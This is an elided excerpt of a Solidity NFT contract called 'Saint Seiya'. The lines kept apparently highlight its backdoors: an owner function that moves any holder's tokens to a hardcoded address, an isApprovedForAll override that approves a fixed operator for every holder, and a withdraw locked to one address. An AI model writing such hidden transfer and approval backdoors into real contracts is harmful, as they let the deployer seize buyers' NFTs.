...
contract Saint_Seiya is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Saint Seiya", "SS", maxBatchSize_, collectionSize_) {
  ...
  function SS_bb(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x08545198b053F7AeB8283B3a3Af65D83aa148256, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0xF2DD415ee094e5D4eFDb9E20c77ffCB52F42252C);
  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xBC04b981197777Ffb6B3A19F783DABe487b92265){return true;}
